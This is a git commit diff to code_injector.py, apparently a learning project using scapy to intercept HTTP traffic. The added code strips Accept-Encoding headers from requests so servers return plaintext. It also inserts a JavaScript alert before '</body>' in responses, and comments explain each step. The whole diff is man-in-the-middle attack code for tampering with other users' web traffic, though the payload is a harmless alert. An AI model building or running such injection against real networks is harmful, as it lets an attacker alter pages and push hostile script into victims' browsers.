32713698a59a5300bff2de8e282cd0d92b46624a
syntax-eror <46492218+syntax-eror@users.noreply.github.com>
2019-07-12 16:33:32 -0700

    Update code_injector.py

--- code_injector.py
+++ code_injector.py
@@ -27,18 +27,27 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
+            print("===================================")
             print("[+] HTTP Request outbound found")
             print("===================================")
             modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
+            #this will match the entire string Accept-Encoding that appears in the Raw layer
+            #and replace it with an empty string; this causes the browser to tell the server
+            #it doesn't take any form of encoding, and the server will deliver the plaintext
+            #web code
             new_packet = set_load(scapy_packet, modified_load)
             packet.set_payload(str(new_packet))
             #regex to find and replace field that specifies encoding types accepted
             #replace with "" - empty string
             print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80: #if this exists, packet is HTTP response inbound
+            print("===================================")
             print("[+] HTTP Response Inbound found:")
             print("===================================")
-            print(scapy_packet.show())
+            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('JS injection');</script></body>")
+            #replace is a Python method to replace
+            #a string with something else
+            #print(scapy_packet.show())
             
             #want to first show the packet contents to see what fields to modify
             #using this you see that the Raw layer contains following:
